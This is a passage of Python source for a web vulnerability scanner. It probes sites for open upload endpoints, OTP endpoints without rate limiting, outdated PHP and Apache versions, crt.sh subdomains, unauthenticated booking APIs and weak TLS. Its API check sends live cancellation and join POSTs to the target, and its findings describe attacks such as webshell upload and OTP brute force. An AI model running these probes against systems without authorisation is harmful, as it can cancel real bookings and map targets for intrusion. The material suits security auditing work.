                headers={"User-Agent": "CyberScan/1.0 Security Audit"},
                method="HEAD",
            )
            try:
                with urllib.request.urlopen(req, timeout=6) as r:
                    status = r.status
            except urllib.error.HTTPError as e:
                status = e.code

            # 200/405 = endpoint exists (405 = Method Not Allowed means it's
            # there but only accepts POST — still interesting)
            if status in (200, 405):
                found.append((path, status))
        except Exception:
            pass

    if found:
        paths_str = ", ".join(f"{p} ({s})" for p, s in found[:5])
        findings.append({
            "id": "unauth_upload",
            "name": f"Unauthenticated Upload Endpoint Detected ({len(found)} found)",
            "category": "File Upload / Remote Code Execution",
            "severity": "critical",
            "status": "vulnerable",
            "matched_at": base_url,
            "attacker_can": (
                f"Access file upload endpoint(s) without authentication: {paths_str}. "
                "If the endpoint accepts PHP, ASP, or script files, an attacker can upload a webshell "
                "and execute arbitrary commands on your server — reading databases, stealing files, "
                "installing backdoors, or using your server to attack other systems. "
                "This is one of the highest-severity vulnerabilities in web security."
            ),
            "attacker_cannot": None,
            "recommendation": (
                "Immediately require authentication on all upload endpoints. "
                "Validate file extensions server-side — whitelist only safe types (jpg, png, pdf). "
                "Store uploads outside the web root so they cannot be executed. "
                "Rename uploaded files to random UUIDs, stripping the original extension. "
                "Scan uploaded files with antivirus before storing."
            ),
            "detail": f"Upload endpoints responding without auth: {paths_str}",
            "burp": BURP_UNAUTH_UPLOAD,
        })
    else:
        findings.append({
            "id": "unauth_upload",
            "name": "No Exposed Upload Endpoints",
            "category": "File Upload / Remote Code Execution",
            "severity": "info",
            "status": "protected",
            "matched_at": base_url,
            "attacker_can": None,
            "attacker_cannot": "Access file upload functionality without authentication — no unauthenticated upload endpoints found.",
            "recommendation": None,
            "detail": f"Tested {len(UPLOAD_PATHS)} upload paths — none responded without authentication.",
            "burp": None,
        })

    return findings


# ---------------------------------------------------------------------------
# OTP / password reset endpoint brute-force check
# ---------------------------------------------------------------------------

def _check_otp_bruteforce(base_url: str) -> list:
    """
    Detect OTP and password-reset endpoints with no rate limiting.
    Sends 15 rapid requests and checks for 429 / rate-limit headers.
    A 6-digit OTP with no lockout is brute-forceable in ~30 minutes.
    """
    from urllib.parse import urljoin
    import time as _time

    OTP_PATHS = [
        "/OTP_verification.php", "/OTP_getnumber.php", "/otp_verify.php",
        "/otp-verify", "/otp/verify", "/verify-otp", "/verifyOTP",
        "/forgot-password", "/forgot_password", "/forgotpassword",
        "/reset-password", "/reset_password", "/password-reset",
        "/send_otp", "/send-otp", "/resend_otp", "/resend-otp",
        "/api/otp/verify", "/api/otp/send", "/api/auth/otp",
        "/auth/forgot-password", "/auth/reset-password",
        "/account/forgot-password", "/user/forgot-password",
        "/send_email_otp.php", "/verify_email_otp.php",
    ]

    findings = []
    vulnerable_endpoints = []

    for path in OTP_PATHS:
        target = urljoin(base_url, path)
        try:
            # First check if endpoint exists
            req = urllib.request.Request(
                target,
                headers={"User-Agent": "CyberScan/1.0 Security Audit"},
                method="GET",
            )
            try:
                with urllib.request.urlopen(req, timeout=5) as r:
                    initial_status = r.status
            except urllib.error.HTTPError as e:
                initial_status = e.code

            # Only probe endpoints that actually exist (not 404)
            if initial_status == 404:
                continue

            # Fire 15 rapid requests and check for rate limiting
            got_rate_limited = False
            statuses = []
            for _ in range(15):
                try:
                    r2 = urllib.request.Request(
                        target,
                        headers={"User-Agent": "CyberScan/1.0 Security Audit"},
                        method="GET",
                    )
                    with urllib.request.urlopen(r2, timeout=4) as resp:
                        code = resp.status
                        resp_headers = dict(resp.headers)
                        statuses.append(code)
                        if code == 429:
                            got_rate_limited = True
                            break
                        rl_headers = ("retry-after", "x-ratelimit-limit", "x-rate-limit",
                                      "ratelimit-limit", "x-ratelimit-remaining")
                        if any(h in resp_headers for h in rl_headers):
                            got_rate_limited = True
                            break
                except urllib.error.HTTPError as e:
                    statuses.append(e.code)
                    if e.code == 429:
                        got_rate_limited = True
                        break
                except Exception:
                    break

            if not got_rate_limited and len(statuses) >= 10:
                vulnerable_endpoints.append(path)

        except Exception:
            pass

    if vulnerable_endpoints:
        findings.append({
            "id": "otp_bruteforce",
            "name": f"OTP / Password Reset — No Rate Limiting ({len(vulnerable_endpoints)} endpoint{'s' if len(vulnerable_endpoints) > 1 else ''})",
            "category": "Authentication — Brute Force",
            "severity": "critical",
            "status": "vulnerable",
            "matched_at": base_url,
            "attacker_can": (
                f"Brute-force OTP and password reset codes on {len(vulnerable_endpoints)} endpoint(s): "
                f"{', '.join(vulnerable_endpoints[:3])}. "
                "A 6-digit OTP has 1,000,000 combinations — with no rate limiting, Burp Intruder "
                "cracks it in under 30 minutes. On success the server returns the victim's account "
                "credentials, giving the attacker full access to any guest account they target "
                "using just a booking number or email address."
            ),
            "attacker_cannot": None,
            "recommendation": (
                "Implement rate limiting on all OTP endpoints: maximum 5 attempts per 15 minutes per IP and per account. "
                "Add account lockout after 10 failed attempts. "
                "Use short OTP expiry (2–5 minutes). "
                "Consider increasing OTP entropy to 8+ digits or using alphanumeric codes. "
                "Log and alert on abnormal OTP attempt volumes."
            ),
            "detail": f"No rate limiting detected on: {', '.join(vulnerable_endpoints)}",
            "burp": BURP_OTP_BRUTEFORCE,
        })
    else:
        findings.append({
            "id": "otp_bruteforce",
            "name": "OTP / Password Reset Endpoints — Rate Limiting Present",
            "category": "Authentication — Brute Force",
            "severity": "info",
            "status": "protected",
            "matched_at": base_url,
            "attacker_can": None,
            "attacker_cannot": "Brute-force OTP codes — rate limiting or lockout detected on password reset endpoints.",
            "recommendation": None,
            "detail": f"Tested {len(OTP_PATHS)} OTP/reset paths — no unprotected endpoints found.",
            "burp": None,
        })

    return findings


# ---------------------------------------------------------------------------
# End-of-life / outdated server software detection
# ---------------------------------------------------------------------------

def _check_eol_software(headers: dict, url: str) -> list:
    """
    Detect end-of-life server software versions from response headers.
    PHP < 7.0 = critical (EOL since 2018), PHP < 8.0 = high (EOL since 2023).
    Old Apache/nginx versions are flagged with known CVEs.
    """
    import re as _re

    findings = []

    server = headers.get("server", "")
    xpb = headers.get("x-powered-by", "")
    combined = f"{server} {xpb}"

    # ── PHP version checks ─────────────────────────────────────────────────
    php_match = _re.search(r'PHP[/\s](\d+)\.(\d+)(?:\.(\d+))?', combined, _re.IGNORECASE)
    if php_match:
        major = int(php_match.group(1))
        minor = int(php_match.group(2))
        patch = php_match.group(3) or "0"
        version_str = f"{major}.{minor}.{patch}"

        if major < 7:
            findings.append({
                "id": "eol_php",
                "name": f"End-of-Life PHP Version: {version_str} (Critical)",
                "category": "Outdated / End-of-Life Software",
                "severity": "critical",
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Target this server with exploits designed for PHP {version_str} — a version that "
                    f"reached end-of-life in {'December 2018' if major == 5 else '2017'} and has received "
                    "no security patches since. Known critical CVEs include remote code execution via "
                    "CGI argument injection (CVE-2012-1823), object injection, and unserialize() exploits. "
                    "Metasploit contains ready-made modules for these. No custom exploit development needed."
                ),
                "attacker_cannot": None,
                "recommendation": (
                    f"Upgrade PHP immediately. PHP {version_str} is critically out of date with no security support. "
                    "Minimum: PHP 8.1 (supported until November 2025). Recommended: PHP 8.3. "
                    "PHP 5.x has known unauthenticated RCE vulnerabilities with public exploits."
                ),
                "detail": f"PHP/{version_str} detected in response headers — EOL since {'2018' if major == 5 else '2017'}, no security patches available.",
                "burp": BURP_EOL_SOFTWARE,
            })
        elif major == 7:
            findings.append({
                "id": "eol_php",
                "name": f"End-of-Life PHP Version: {version_str} (High)",
                "category": "Outdated / End-of-Life Software",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Target this server with PHP 7.x-specific vulnerabilities. PHP {version_str} reached "
                    "end-of-life in November 2022 and no longer receives security updates. "
                    "Any vulnerability discovered after EOL will never be patched — leaving the server "
                    "permanently exposed to future exploits."
                ),
                "attacker_cannot": None,
                "recommendation": (
                    f"Upgrade from PHP {version_str} to PHP 8.1+ as soon as possible. "
                    "PHP 7.x is end-of-life and receives no security patches."
                ),
                "detail": f"PHP/{version_str} detected — EOL since November 2022.",
                "burp": BURP_EOL_SOFTWARE,
            })
        else:
            findings.append({
                "id": "eol_php",
                "name": f"PHP Version: {version_str} (Current)",
                "category": "Outdated / End-of-Life Software",
                "severity": "info",
                "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": f"Target known EOL PHP exploits — PHP {version_str} is in active support.",
                "recommendation": None,
                "detail": f"PHP/{version_str} detected — currently supported version.",
                "burp": None,
            })

    # ── Apache version checks ──────────────────────────────────────────────
    apache_match = _re.search(r'Apache[/\s](\d+)\.(\d+)(?:\.(\d+))?', combined, _re.IGNORECASE)
    if apache_match:
        major = int(apache_match.group(1))
        minor = int(apache_match.group(2))
        patch = int(apache_match.group(3) or 0)
        version_str = f"{major}.{minor}.{patch}"

        is_eol = (major == 2 and minor <= 2) or (major == 2 and minor == 4 and patch < 51)
        if is_eol:
            findings.append({
                "id": "eol_apache",
                "name": f"Outdated Apache Version: {version_str}",
                "category": "Outdated / End-of-Life Software",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Exploit known Apache {version_str} vulnerabilities. Apache 2.2.x reached EOL in 2018. "
                    "Apache 2.4.x versions below 2.4.51 are vulnerable to CVE-2021-41773 (path traversal / RCE) "
                    "and CVE-2021-42013 (remote code execution) — with Metasploit modules publicly available."
                ),
                "attacker_cannot": None,
                "recommendation": f"Upgrade Apache to the latest 2.4.x release. Apache {version_str} has known unpatched CVEs.",
                "detail": f"Apache/{version_str} detected in Server header — outdated version with known CVEs.",
                "burp": BURP_EOL_SOFTWARE,
            })

    return findings


# ---------------------------------------------------------------------------
# Certificate transparency subdomain enumeration (crt.sh)
# ---------------------------------------------------------------------------

def _check_crtsh_subdomains(url: str) -> list:
    """
    Query crt.sh SSL certificate transparency logs to discover ALL subdomains
    that have ever had a certificate issued — including legacy, dev, staging.
    Far more comprehensive than wordlist-based guessing.
    """
    import json as _json
    import re as _re
    from urllib.parse import urlparse, urljoin

    findings = []
    parsed = urlparse(url)
    hostname = parsed.hostname or ""
    scheme = parsed.scheme

    root = hostname
    if root.startswith("www."):
        root = root[4:]

    try:
        crtsh_url = f"https://crt.sh/?q=%25.{root}&output=json"
        req = urllib.request.Request(
            crtsh_url,
            headers={"User-Agent": "CyberScan/1.0 Security Audit"},
        )
        with urllib.request.urlopen(req, timeout=15) as r:
            data = _json.loads(r.read(500000).decode("utf-8", errors="ignore"))

        # Extract unique subdomains
        seen = set()
        subdomains = []
        for entry in data:
            name = entry.get("name_value", "")
            for sub in name.splitlines():
                sub = sub.strip().lower().lstrip("*.")
                if sub and sub.endswith(root) and sub != root and sub not in seen:
                    seen.add(sub)
                    subdomains.append(sub)

        if not subdomains:
            findings.append({
                "id": "crtsh_subdomains",
                "name": "Certificate Transparency — No Additional Subdomains",
                "category": "Reconnaissance / Attack Surface",
                "severity": "info",
                "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": "Discover hidden subdomains via certificate transparency — none found in crt.sh.",
                "recommendation": None,
                "detail": f"crt.sh query for *.{root} returned no additional subdomains.",
                "burp": None,
            })
            return findings

        # Probe each discovered subdomain for liveness
        live = []
        for sub in subdomains[:40]:  # cap at 40 to avoid long scans
            for s in (scheme, "https", "http"):
                target = f"{s}://{sub}"
                try:
                    req2 = urllib.request.Request(
                        target,
                        headers={"User-Agent": "CyberScan/1.0 Security Audit"},
                        method="HEAD",
                    )
                    with urllib.request.urlopen(req2, timeout=5) as r2:
                        server = r2.headers.get("server", "")
                        xpb = r2.headers.get("x-powered-by", "")
                        live.append({
                            "host": sub,
                            "url": target,
                            "status": r2.status,
                            "server": server or xpb or "unknown",
                        })
                        break
                except urllib.error.HTTPError as e:
                    if e.code not in (403, 401):
                        pass
                    else:
                        live.append({
                            "host": sub,
                            "url": target,
                            "status": e.code,
                            "server": e.headers.get("server", "unknown") if e.headers else "unknown",
                        })
                    break
                except Exception:
                    pass

        if live:
            detail_lines = [f"{e['host']} [{e['status']}] ({e['server']})" for e in live[:10]]
            findings.append({
                "id": "crtsh_subdomains",
                "name": f"Certificate Transparency — {len(subdomains)} Subdomains Found, {len(live)} Live",
                "category": "Reconnaissance / Attack Surface",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": url,
                "attacker_can": (
                    f"Enumerate your entire subdomain attack surface via crt.sh — {len(subdomains)} subdomain(s) found "
                    f"in SSL certificate transparency logs, {len(live)} confirmed live. "
                    "Legacy and development subdomains often run older software, lack WAF protection, "
                    "have directory listing enabled, or expose admin panels removed from the main site. "
                    "Certificate transparency is public — any attacker can run this query in 10 seconds."
                ),
                "attacker_cannot": None,
                "recommendation": (
                    "Audit every subdomain found in crt.sh. Decommission any legacy or development subdomains "
                    "that are no longer needed. Apply the same security hardening to all subdomains as the main site. "
                    "Consider using wildcard certificates to reduce certificate transparency exposure."
                ),
                "detail": f"crt.sh found {len(subdomains)} subdomains for {root}. Live: {' | '.join(detail_lines)}",
                "burp": BURP_CRTSH,
            })
        else:
            findings.append({
                "id": "crtsh_subdomains",
                "name": f"Certificate Transparency — {len(subdomains)} Subdomains Found (None Live)",
                "category": "Reconnaissance / Attack Surface",
                "severity": "info",
                "status": "protected",
                "matched_at": url,
                "attacker_can": None,
                "attacker_cannot": None,
                "recommendation": None,
                "detail": f"crt.sh found {len(subdomains)} historical subdomain(s) for {root} but none responded.",
                "burp": None,
            })

    except Exception as e:
        findings.append({
            "id": "crtsh_subdomains",
            "name": "Certificate Transparency Scan",
            "category": "Reconnaissance / Attack Surface",
            "severity": "info",
            "status": "protected",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": None,
            "recommendation": None,
            "detail": f"crt.sh query skipped: {e}",
            "burp": None,
        })

    return findings


# ---------------------------------------------------------------------------
# Unauthenticated API / booking endpoint check
# ---------------------------------------------------------------------------

def _check_unauth_api_endpoints(base_url: str) -> list:
    """
    Probe for sensitive booking/account API endpoints that respond with
    real data or accept actions without requiring authentication.
    Pattern: PHP endpoints that return JSON or database responses with no auth.
    """
    from urllib.parse import urljoin
    import json as _json

    # (path, method, post_data) — real endpoints found during Aphrodite Hills research
    SENSITIVE_PATHS = [
        ("/cancel.php", "POST", b"booking_id=1&class_id=1"),
        ("/join.php", "POST", b"class_id=1&client_id=1"),
        ("/waiting.php", "POST", b"class_id=1&client_id=1"),
        ("/leavewaiting.php", "POST", b"class_id=1&client_id=1"),
        ("/json_coupon_code.php", "POST", b"coupon_code=TEST"),
        ("/json_newclient.php", "POST", b"email=test@test.com&name=test"),
        ("/getsessions_week.php", "GET", None),
        ("/json_vod.php", "GET", None),
        ("/api/bookings", "GET", None),
        ("/api/reservations", "GET", None),
        ("/api/users", "GET", None),
        ("/api/orders", "GET", None),
        ("/api/cancellations", "POST", b"booking_id=1"),
        ("/bookings/cancel", "POST", b"id=1"),
        ("/reservations/cancel", "POST", b"id=1"),
        ("/account/details", "GET", None),
        ("/user/profile", "GET", None),
        ("/api/v1/bookings", "GET", None),
        ("/api/v1/users", "GET", None),
    ]

    findings = []
    exposed = []

    for path, method, post_data in SENSITIVE_PATHS:
        target = urljoin(base_url, path)
        try:
            req = urllib.request.Request(
                target,
                data=post_data,
                headers={
                    "User-Agent": "CyberScan/1.0 Security Audit",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                method=method,
            )
            try:
                with urllib.request.urlopen(req, timeout=6) as r:
                    status = r.status
                    body = r.read(2000).decode("utf-8", errors="ignore")
            except urllib.error.HTTPError as e:
                status = e.code
                body = ""

            # Flag if endpoint returns 200 with JSON-like or DB-like content (not a login redirect)
            if status == 200 and body:
                looks_sensitive = any(kw in body.lower() for kw in (
                    "booking", "class", "client", "session", "already", "full",
                    "subscribed", "cancelled", "success", "error", "invalid",
                    "{", "[",  # JSON indicators
                ))
                looks_like_login_redirect = any(kw in body.lower() for kw in (
                    "login", "sign in", "unauthorized", "please log in", "<html",
                ))
                if looks_sensitive and not looks_like_login_redirect:
                    exposed.append((path, method, body[:120].strip()))

        except Exception:
            pass

    if exposed:
        detail_lines = [f"{m} {p} → {b[:80]}" for p, m, b in exposed[:5]]
        findings.append({
            "id": "unauth_api",
            "name": f"Unauthenticated Sensitive API Endpoints ({len(exposed)} found)",
            "category": "Broken Access Control / IDOR",
            "severity": "high",
            "status": "vulnerable",
            "matched_at": base_url,
            "attacker_can": (
                f"Call {len(exposed)} booking/account API endpoint(s) with no authentication: "
                f"{', '.join(p for p, _, _ in exposed[:3])}. "
                "Without auth checks, an attacker can cancel other guests' bookings, join classes as someone else, "
                "enumerate user data, or trigger account actions on any booking ID they can guess or enumerate. "
                "Combined with IDOR, every guest's data and reservations are exposed."
            ),
            "attacker_cannot": None,
            "recommendation": (
                "Require authentication on every API endpoint that reads or modifies user data. "
                "Verify server-side that the authenticated user owns the resource they are acting on. "
                "Return 401 Unauthorized (not 200) for unauthenticated requests to sensitive endpoints."
            ),
            "detail": " | ".join(detail_lines),
            "burp": BURP_UNAUTH_API,
        })
    else:
        findings.append({
            "id": "unauth_api",
            "name": "No Exposed Unauthenticated API Endpoints",
            "category": "Broken Access Control / IDOR",
            "severity": "info",
            "status": "protected",
            "matched_at": base_url,
            "attacker_can": None,
            "attacker_cannot": "Access booking or account data without authentication — all sensitive endpoints returned auth challenges or 404.",
            "recommendation": None,
            "detail": f"Tested {len(SENSITIVE_PATHS)} sensitive API paths — no unauthenticated access found.",
            "burp": None,
        })

    return findings


def run_http_checks(url: str) -> tuple:
    """
    Returns (findings_list, cloudflare_info_dict).
    cloudflare_info is always present — detected=False if not behind Cloudflare.
    """
    from urllib.parse import urlparse
    results = []
    results.append(_check_ssl(url))
    hostname = urlparse(url).hostname or ""

    try:
        headers, status, final_url = _fetch(url)
    except Exception as e:
        cf_info = _detect_cloudflare({}, hostname)
        results.append({
            "id": "fetch_error",
            "name": "Site Reachability",
            "category": "Connectivity",
            "severity": "critical",
            "status": "vulnerable",
            "matched_at": url,
            "attacker_can": None,
            "attacker_cannot": None,
            "recommendation": "Verify the URL is correct and the server is running.",
            "detail": f"Could not connect: {e}",
        })
        return results, cf_info

    cf_info = _detect_cloudflare(headers, hostname)

    for chk in CHECKS:
        burp = BURP_INFO.get(chk["id"])
        if chk["header"] is None:
            server = headers.get("server", "")
            xpb = headers.get("x-powered-by", "")
            if server or xpb:
                detail_parts = []
                if server: detail_parts.append(f"Server: {server}")
                if xpb: detail_parts.append(f"X-Powered-By: {xpb}")
                results.append({
                    "id": chk["id"], "name": chk["name"], "category": chk["category"],
                    "severity": chk["severity_fail"], "status": "vulnerable",
                    "matched_at": url,
                    "attacker_can": chk["attacker_can"], "attacker_cannot": None,
                    "recommendation": chk["recommendation"],
                    "detail": " | ".join(detail_parts), "burp": burp,
                })
            else:
                results.append({
                    "id": chk["id"], "name": chk["name"], "category": chk["category"],
                    "severity": "info", "status": "protected",
                    "matched_at": url,
                    "attacker_can": None, "attacker_cannot": chk["attacker_cannot"],
                    "recommendation": None,
                    "detail": "No server version headers detected.", "burp": burp,
                })
        else:
            present = chk["header"] in headers
            results.append({
                "id": chk["id"], "name": chk["name"], "category": chk["category"],
                "severity": chk["severity_fail"] if not present else "info",
                "status": "protected" if present else "vulnerable",
                "matched_at": url,
                "attacker_can": None if present else chk["attacker_can"],
                "attacker_cannot": chk["attacker_cannot"] if present else None,
                "recommendation": None if present else chk["recommendation"],
                "detail": headers.get(chk["header"], "Header not present"), "burp": burp,
            })

    results.extend(_check_exposed_panels(url))

    # ── CORS misconfiguration ───────────────────────────────────────────────
    results.append(_check_cors(url))

    # ── Cookie security flags ───────────────────────────────────────────────
    results.extend(_check_cookie_security(headers, url))

    # ── Rate limiting detection ─────────────────────────────────────────────
    results.append(_check_rate_limiting(url))

    # ── Promo / bonus endpoint discovery ───────────────────────────────────
    results.extend(_check_promo_endpoints(url))

    # ── JavaScript secret scanning ──────────────────────────────────────────
    results.extend(_check_js_secrets(url))

    # ── Subdomain enumeration ───────────────────────────────────────────────
    results.extend(_check_subdomains(url))

    # ── Origin IP / Cloudflare bypass ───────────────────────────────────────
    results.append(_check_origin_ip(url))

    # ── Game provider callback endpoints ────────────────────────────────────
    results.extend(_check_provider_callbacks(url))

    # ── Game session token endpoints ─────────────────────────────────────────
    results.extend(_check_session_tokens(url))

    # ── WordPress / WooCommerce checks ──────────────────────────────────────
    results.extend(_check_wordpress(url))

    # ── Directory listing detection ─────────────────────────────────────────
    results.extend(_check_directory_listing(url))

    # ── Unauthenticated file upload endpoints ───────────────────────────────
    results.extend(_check_unauthenticated_upload(url))

    # ── OTP / password reset brute-force (no rate limiting) ─────────────────
    results.extend(_check_otp_bruteforce(url))

    # ── End-of-life / outdated server software ──────────────────────────────
    results.extend(_check_eol_software(headers, url))

    # ── Certificate transparency subdomain enumeration (crt.sh) ─────────────
    results.extend(_check_crtsh_subdomains(url))

    # ── Unauthenticated sensitive API / booking endpoints ───────────────────
    results.extend(_check_unauth_api_endpoints(url))

    return results, cf_info


# ---------------------------------------------------------------------------
# SSL Labs deep TLS analysis
# ---------------------------------------------------------------------------

SSL_LABS_API = "https://api.ssllabs.com/api/v3"

def _ssl_labs_get(params: dict) -> dict:
    qs = "&".join(f"{k}={v}" for k, v in params.items())
    req = urllib.request.Request(
        f"{SSL_LABS_API}/analyze?{qs}",
        headers={"User-Agent": "CyberScan/1.0 Security Audit"},
    )
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.loads(r.read())


def run_ssl_labs_checks(url: str) -> list:
    """
    Query the free SSL Labs API for deep TLS analysis.
    Returns findings in the same format as run_http_checks().
    Works even on Cloudflare-protected sites because it operates at TLS level.
    """
    from urllib.parse import urlparse
    parsed = urlparse(url)
    hostname = parsed.hostname
    if not hostname or parsed.scheme != "https":
        return []

    findings = []
    try:
        # Kick off scan (fromCache=on reuses recent results so we don't wait)
        data = _ssl_labs_get({"host": hostname, "fromCache": "on", "all": "done"})

        # If cache miss, start fresh and poll
        if data.get("status") == "DNS":
            data = _ssl_labs_get({"host": hostname, "startNew": "on", "all": "done"})

        attempts = 0
        while data.get("status") not in ("READY", "ERROR") and attempts < 25:
            time.sleep(8)
            data = _ssl_labs_get({"host": hostname, "all": "done"})
            attempts += 1

        if data.get("status") != "READY":
            return []

        endpoints = data.get("endpoints", [])
        if not endpoints:
            return []

        # Use the best-graded endpoint
        endpoints_sorted = sorted(endpoints, key=lambda e: e.get("grade", "Z"))
        ep = endpoints_sorted[0]
        grade = ep.get("grade", "?")
        details = ep.get("details", {})

        # ── Grade summary finding ──────────────────────────────────────────
        grade_is_bad = grade not in ("A", "A+")
        grade_attacker_can = (
            f"Exploit TLS weaknesses on this server — SSL Labs grades it '{grade}' meaning it supports "
            "deprecated protocols or weak ciphers that enable downgrade and decryption attacks."
        ) if grade_is_bad else None
        grade_attacker_cannot = (
            "Exploit TLS weaknesses — SSL Labs grades this server A or A+, meaning modern-only "
            "protocols and strong ciphers are enforced."
        ) if not grade_is_bad else None
        findings.append({
            "id": "ssl_labs_grade",
            "name": f"SSL Labs Grade: {grade}",
            "category": "TLS Deep Analysis (SSL Labs)",
            "severity": "high" if grade_is_bad else "info",
            "status": "vulnerable" if grade_is_bad else "protected",
            "matched_at": hostname,
            "attacker_can": grade_attacker_can,
            "attacker_cannot": grade_attacker_cannot,
            "recommendation": "Target an A+ grade: enable TLS 1.3 only, disable TLS 1.0/1.1, deploy HSTS, use AEAD ciphers." if grade_is_bad else None,
            "detail": f"SSL Labs assessed {hostname} and assigned grade {grade}.",
            "burp": None,
        })

        # ── TLS 1.0 / 1.1 still supported ─────────────────────────────────
        protocols = details.get("protocols", [])
        weak_proto_names = [
            f"TLS {p['version']}" for p in protocols
            if str(p.get("version", "")) in ("1.0", "1.1")
        ]
        if weak_proto_names:
            proto_str = " and ".join(weak_proto_names)
            findings.append({
                "id": "ssl_labs_tls_old",
                "name": f"Deprecated TLS Protocol: {proto_str} Enabled",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    f"Force your server into {proto_str} — a deprecated protocol full of known "
                    "vulnerabilities. On TLS 1.0 + CBC ciphers the attacker can execute the BEAST attack "
                    "to decrypt your users' session cookies byte-by-byte. This also caps your SSL Labs "
                    f"grade to B and may fail PCI DSS compliance audits."
                ),
                "attacker_cannot": None,
                "recommendation": f"Disable {proto_str} in your TLS configuration. Only TLS 1.2 (with AEAD ciphers) and TLS 1.3 should be enabled.",
                "detail": f"Server supports: {', '.join(weak_proto_names)}. These should be disabled.",
                "burp": BURP_TLS_OLD,
            })
        else:
            enabled = [f"TLS {p['version']}" for p in protocols]
            findings.append({
                "id": "ssl_labs_tls_old",
                "name": "Modern TLS Protocols Only",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Force a downgrade to deprecated TLS 1.0 or 1.1 — only modern TLS versions are accepted.",
                "recommendation": None,
                "detail": f"Enabled: {', '.join(enabled)}. No deprecated protocols.",
                "burp": None,
            })

        # ── Weak cipher suites ─────────────────────────────────────────────
        suites_data = details.get("suites", [])
        weak_ciphers = []
        for suite_group in suites_data:
            for cs in suite_group.get("list", []):
                if cs.get("q") == 0:  # q=0 means WEAK in SSL Labs API
                    weak_ciphers.append(cs.get("name", "Unknown"))
        if weak_ciphers:
            sample = weak_ciphers[:3]
            findings.append({
                "id": "ssl_labs_weak_ciphers",
                "name": f"Weak Cipher Suites Enabled ({len(weak_ciphers)} found)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    f"Negotiate a weak cipher suite (e.g. {sample[0]}) during the TLS handshake. "
                    "CBC-mode ciphers are vulnerable to Lucky13 and BEAST padding oracle attacks — "
                    "the attacker captures encrypted traffic and, through thousands of crafted requests, "
                    "recovers plaintext session tokens without the private key."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable all CBC and 3DES cipher suites. Configure your server to use only AEAD ciphers: AES-GCM and ChaCha20-Poly1305.",
                "detail": f"Weak ciphers: {', '.join(weak_ciphers[:5])}{'...' if len(weak_ciphers) > 5 else ''}",
                "burp": BURP_WEAK_CIPHER,
            })
        else:
            findings.append({
                "id": "ssl_labs_weak_ciphers",
                "name": "No Weak Cipher Suites",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "info",
                "status": "protected",
                "matched_at": hostname,
                "attacker_can": None,
                "attacker_cannot": "Negotiate a weak cipher — only strong AEAD cipher suites are offered.",
                "recommendation": None,
                "detail": "All cipher suites use strong AEAD encryption (AES-GCM / ChaCha20).",
                "burp": None,
            })

        # ── BEAST ─────────────────────────────────────────────────────────
        if details.get("vulnBeast"):
            findings.append({
                "id": "ssl_labs_beast",
                "name": "BEAST Attack — Not Mitigated",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "medium",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Execute the BEAST (Browser Exploit Against SSL/TLS) attack against users on TLS 1.0. "
                    "By injecting JavaScript into any resource the victim's browser loads, the attacker "
                    "controls part of the plaintext and can decrypt session cookies byte-by-byte — "
                    "gaining full account access without knowing the password."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable TLS 1.0 entirely and prioritise TLS 1.3. If TLS 1.2 must be kept, use only GCM (AEAD) cipher suites — they are immune to BEAST.",
                "detail": "Server supports TLS 1.0 + CBC ciphers. BEAST is unmitigated server-side.",
                "burp": BURP_BEAST,
            })

        # ── POODLE ────────────────────────────────────────────────────────
        if details.get("poodle") or details.get("poodleTls") == 2:
            findings.append({
                "id": "ssl_labs_poodle",
                "name": "POODLE Attack Vulnerable",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Exploit the POODLE (Padding Oracle On Downgraded Legacy Encryption) vulnerability "
                    "to decrypt HTTPS sessions. The attacker forces a downgrade to SSLv3, then uses "
                    "your browser as a padding oracle — making ~256 crafted requests per byte of your "
                    "session cookie. A typical session cookie is cracked in under 5 minutes."
                ),
                "attacker_cannot": None,
                "recommendation": "Disable SSLv3 completely on your server. It has no safe use — TLS 1.2+ replaces it entirely.",
                "detail": "Server is vulnerable to POODLE — SSLv3 padding oracle attack confirmed.",
                "burp": BURP_POODLE,
            })

        # ── Heartbleed ────────────────────────────────────────────────────
        if details.get("heartbleed"):
            findings.append({
                "id": "ssl_labs_heartbleed",
                "name": "Heartbleed Vulnerability (CVE-2014-0160)",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "critical",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Read up to 64KB of your server's live RAM per request — completely unauthenticated. "
                    "This memory contains TLS private keys, session tokens, plaintext passwords from "
                    "active user sessions, database credentials, and API keys. The attacker can "
                    "impersonate your server, decrypt past and future traffic, and steal any user's "
                    "session. It leaves no trace in your access logs."
                ),
                "attacker_cannot": None,
                "recommendation": "Update OpenSSL immediately to 1.0.1g or later. Revoke and reissue all TLS certificates. Invalidate all session tokens. This is a critical emergency fix.",
                "detail": "Heartbleed (CVE-2014-0160) confirmed — OpenSSL memory leak via malformed heartbeat request.",
                "burp": BURP_HEARTBLEED,
            })

        # ── DROWN ─────────────────────────────────────────────────────────
        if details.get("drownVulnerable"):
            findings.append({
                "id": "ssl_labs_drown",
                "name": "DROWN Attack Vulnerable",
                "category": "TLS Deep Analysis (SSL Labs)",
                "severity": "high",
                "status": "vulnerable",
                "matched_at": hostname,
                "attacker_can": (
                    "Decrypt your modern TLS traffic by attacking SSLv2 on the same server (or another "
